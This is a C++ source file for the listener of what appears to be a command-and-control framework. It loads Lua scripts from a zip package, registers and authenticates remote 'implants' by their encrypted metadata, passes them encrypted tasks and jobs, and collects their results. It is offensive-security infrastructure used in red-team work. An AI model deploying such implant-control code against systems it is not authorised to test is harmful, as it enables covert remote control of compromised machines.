#include "listener.h"

#include <filesystem>

#include <spdlog/spdlog.h>
#include <moon.hpp>
#include <util/zip.hpp>
#include <util/string.hpp>

#include "services/config.h"
#include "metadata.h"
#include "encryption.h"
#include "modules.h"
#include "implant.h"

namespace lua {

#ifdef _WIN32
#define LIB_SUFFIX ".dll"
#else
#define LIB_SUFFIX ".so"
#endif
#define LUA_SUFFIX ".lua"

#define INIT_LUA "init" LUA_SUFFIX

listener::listener(std::string id,
                   std::string name,
                   std::vector<unsigned char> package,
                   std::vector<std::string> arguments)
    : id{std::move(id)}, name{std::move(name)}, package{std::move(package)}, arguments{std::move(arguments)}, running_{false} {}

bool listener::start() {
  std::unique_lock<std::shared_mutex> guard(mutex_);
  if (running_)
    return running_;

  running_ = true;
  thread_ = std::async(std::launch::async, [this] { run_listener(); });
  auto status = thread_.wait_for(std::chrono::milliseconds(250));
  if (status == std::future_status::ready)
    running_ = false;
  return running_;
}

void listener::stop(bool wait) {
  std::unique_lock<std::shared_mutex> guard(mutex_);
  running_ = false;
  if (wait) thread_.wait();
}

void listener::run_listener() {
  thread_storage::luaopen_objects.emplace_back("listener", this);
  thread_storage::luaopen_objects.emplace_back("messages", this);
  thread_storage::luaopen_objects.emplace_back("implants", lua::implant::instance());

  std::string script;
  lua_State *L = luaL_newstate();

  try {
    util::zip::zip_file zip(package);

    if (!zip.has_file(INIT_LUA))
      throw std::runtime_error("No '" INIT_LUA "' script found in package");

    script = zip.read(INIT_LUA);

    auto infolist = zip.infolist();
    for (const auto& info : infolist) {
      if (info.is_dir) continue; // skip
      if (!util::string::ends_with(info.filename, LUA_SUFFIX) && !util::string::ends_with(info.filename, LIB_SUFFIX)) continue;
      if (info.filename == INIT_LUA) continue;

      auto path = std::filesystem::path(info.filename);
      auto ext = path.extension().string();
      auto stem = path.stem().string();
      auto dir = path.parent_path().string();
      if (!dir.empty()) dir.append("/");

      auto modname = dir.append(stem);
      std::replace(modname.begin(), modname.end(), '/', '.');

      auto bytes = zip.read(info.filename);

      if (ext == LUA_SUFFIX) {
        moon_addmeml(L, modname.c_str(), bytes.data(), bytes.size(), 0);
      }
      else {
        moon_addmemc(L, modname.c_str(), bytes.data(), bytes.size(), 0);
      }
    }

    moon_output_cb(L, [](lua_State *LS, const void* data, size_t length, void *userdata) {
      auto l = (listener*) userdata;
      auto output = std::string((char*)data, length);
      l->output_.append(output);
      std::string::size_type pos = output.find_last_not_of("\n \t");
      if (pos != std::string::npos)
        spdlog::debug("'{}' output...\n{}", l->name, output.substr(0, pos + 1));
      else
        spdlog::debug("'{}' output...\n{}", l->name, output);
    }, this);


    std::vector<const char *> argv(arguments.size());
    std::transform(arguments.begin(), arguments.end(), argv.begin(), [](const std::string& str){return str.c_str();});
    moon_doscript(L, argv.size(), const_cast<char **>(argv.data()), script.data(), script.size());
  }
  catch (const std::runtime_error &e) {
    spdlog::error(e.what());
    output_.append(e.what());
  }

  lua_close(L);
  running_ = false;
}

bool listener::is_running() {
  return running_;
}

std::string listener::output() {
  return output_;
}

int listener::luaopen_object(lua_State *L) {
  lua_newtable(L);
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<listener, &listener::lua_run>, 1);
  lua_setfield(L, -2, "run");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<listener, &listener::lua_submit>, 1);
  lua_setfield(L, -2, "submit");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<listener, &listener::lua_retrieve>, 1);
  lua_setfield(L, -2, "retrieve");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<listener, &listener::lua_retrieve_by_token>, 1);
  lua_setfield(L, -2, "retrieve_by_token");
  return 1;
}

int listener::lua_run(lua_State *L) {
  lua_pushboolean(L, is_running() ? 1 : 0); // push result
  return 1; // number of contents
}

int listener::lua_retrieve_by_token(lua_State *L) {
  // check and fetch the arguments
  size_t length;
  const char* str = luaL_checklstring(L, 1, &length);
  auto token = std::string(str, length);

  try {
    auto implant = _implant_service.getById(token);
    std::vector<std::shared_ptr<shared::message>> messages = _dispatcher->pull_send(implant->id->c_str());
    if (!messages.empty()) {
      auto data = encrypt_messages(L, implant, messages);
      lua_pushlstring(L, reinterpret_cast<const char *>(data.data()), data.size());
    } else {
      lua_pushstring(L, "");
    }
    lua_pushnil(L);
  }
  catch (const oatpp::web::protocol::http::HttpError &e) {
    lua_pushnil(L);
    lua_pushstring(L, "Invalid token");
  }
  return 2;
}

int listener::lua_retrieve(lua_State *L) {
  // check and fetch the arguments
  size_t length;
  const char* str = luaL_checklstring(L, 1, &length);
  auto metadata = util::string::convert(str, length);

  auto implant = authenticate(metadata);
  if (implant != nullptr) {
    std::vector<std::shared_ptr<shared::message>> messages = _dispatcher->pull_send(implant->id->c_str());
    auto data = encrypt_messages(L, implant, messages);
    lua_pushstring(L, implant->id->c_str());
    lua_pushlstring(L, reinterpret_cast<const char *>(data.data()), data.size());
    lua_pushnil(L);
  }
  else {
    lua_pushnil(L);
    lua_pushnil(L);
    lua_pushstring(L, "Invalid metadata");
  }
  return 3;
}

oatpp::Object<dto::implant> listener::authenticate(std::vector<unsigned char>& blob) {
  if (!blob.empty()) {
    std::vector<uint8_t> metadata = {};

    spdlog::trace("Authenticating implant, decrypting metadata");

    if (encryption::decryptMetadata(blob, metadata,
                                    _config_service.get_server_secret_key(),
                                    _config_service.get_server_public_key())) {
      try {
        auto m = shared::metadata::deserialize(metadata);
        auto implant_id = oatpp::String(m->id);
        auto public_key_b64 = oatpp::String(util::base64::encode(m->public_key));

        if (!_implant_service.exists(implant_id)) {
          oatpp::Object<dto::implant> dto = dto::implant::createShared();
          dto->id = implant_id;
          dto->listener = id;
          dto->name = implant_id;
          dto->public_key = public_key_b64;
          _implant_service.create(dto);
          return dto;
        } else {
          auto dto = _implant_service.getById(implant_id);
          if (dto->public_key == public_key_b64) {
            return dto;
          }
          else {
            spdlog::error("Authentication failed for implant {}, public keys differ", implant_id->c_str());
          }
        }
      }
      catch (const std::exception &e) {
        spdlog::error("Error parsing metadata {}", e.what());
      }
    }
    else {
      spdlog::trace("Could not decrypt metadata, ignoring");
    }
  }
  else {
    spdlog::trace("Received empty metadata, ignoring");
  }
  return nullptr;
}

std::vector<uint8_t> listener::encrypt_messages(lua_State* L, oatpp::Object<dto::implant> implant, std::vector<std::shared_ptr<shared::message>>& messages) {
  std::vector<uint8_t> data {};
  if (!messages.empty()) {
    spdlog::trace("Sending {} messages to '{}'", messages.size(), implant->id->c_str());

    // TODO should this be really done here!?
    for (const auto &message : messages) {
      if (util::string::compare_insensitive(message->type, "task")) {
        _task_service.update_status(message->id, dto::task_status::RETRIEVED, implant);
        spdlog::debug("Sending task '{}' to '{}'", message->id, implant->id->c_str());
      } else if (util::string::compare_insensitive(message->type, "job_handler")) {
        _job_service.update_status(message->id, dto::job_status::RETRIEVED, implant->id);
        spdlog::debug("Sending job '{}' to '{}'", message->id, implant->id->c_str());
      }
    }

    spdlog::trace("Attempting to encrypt messages");
    encryption::encryptData(shared::message::serialize(messages),
                            data,
                            _config_service.get_server_secret_key(),
                            util::base64::decode(implant->public_key->c_str()));
  }
  return data;
}

int listener::lua_submit(lua_State *L) {
  // check and fetch the arguments
  size_t length;
  const char* a1 = luaL_checklstring(L, 1, &length);
  auto blob = util::string::convert(a1, length);
  const char* a2 = luaL_checklstring(L, 2, &length);
  auto ciphertext = util::string::convert(a2, length);

  std::string token;

  if(!blob.empty()) {
    std::vector<uint8_t> metadata = {};

    spdlog::trace("Implant submitting messages, decrypting metadata");
    if (encryption::decryptMetadata(blob, metadata,
                                    _config_service.get_server_secret_key(),
                                    _config_service.get_server_public_key())) {
      try {
        auto m = shared::metadata::deserialize(metadata);
        auto implant_id = oatpp::String(m->id);
        auto public_key_b64 = oatpp::String(util::base64::encode(m->public_key));

        try {
          bool authenticated = false;
          if (!_implant_service.exists(implant_id)) {
            oatpp::Object<dto::implant> dto = dto::implant::createShared();
            dto->id = implant_id;
            dto->listener = id;
            dto->name = implant_id;
            dto->public_key = public_key_b64;
            _implant_service.create(dto);
            authenticated = true;
          } else {
            auto dto = _implant_service.getById(implant_id);
            if (dto->public_key == public_key_b64)
              authenticated = true;
          }

          if (authenticated) {
            token = implant_id;

            if (!ciphertext.empty()) {
              // Decrypt data using public key provided
              std::vector<uint8_t> data = {};
              auto public_key = util::base64::decode(public_key_b64->c_str());
              spdlog::trace("Encrypted data received from '{}', decrypting", implant_id->c_str());
              if (encryption::decryptData(ciphertext, data, _config_service.get_server_secret_key(), public_key)) {
                if (!data.empty()) {
                  try {
                    auto messages = shared::message::deserialize(data);
                    spdlog::trace("Received {} messages from '{}'", messages.size(), implant_id->c_str());
                    _dispatcher->push_received(implant_id->c_str(), messages);
                  }
                  catch (const std::exception &e) {
                    spdlog::error("Error parsing messages from implant '{}', {}", implant_id->c_str(), e.what());
                    lua_pushnil(L);
                    lua_pushstring(L, "Invalid messages");
                    return 2;
                  }
                }
              }
              else {
                spdlog::error("Error decrypting message for implant '{}'", implant_id->c_str());
                lua_pushnil(L);
                lua_pushstring(L, "Invalid data");
                return 2;
              }
            }
            else {
              spdlog::debug("Received empty ciphertext");
            }
          }
          else {
            spdlog::error("Authentication failed for implant '{}', public keys differ", implant_id->c_str());
            lua_pushnil(L);
            lua_pushstring(L, "Authentication failed");
            return 2;
          }
        }
        catch (const std::exception &e) {
          spdlog::error("Error processing messages from implant '{}', {}", implant_id->c_str(), e.what());
          lua_pushnil(L);
          lua_pushstring(L, "Processing error");
          return 2;
        }
      }
      catch (const std::exception &e) {
        spdlog::error("Error parsing metadata {}", e.what());
        lua_pushnil(L);
        lua_pushstring(L, "Invalid metadata");
        return 2;
      }
    }
    else {
      spdlog::trace("Could not decrypt metadata, ignoring");
      lua_pushnil(L);
      lua_pushstring(L, "Invalid metadata");
      return 2;
    }
  }
  else {
    spdlog::trace("Received empty metadata, ignoring");
    lua_pushnil(L);
    lua_pushstring(L, "No metadata");
    return 2;
  }

  lua_pushstring(L, token.c_str());
  lua_pushnil(L);
  return 2;
}

}
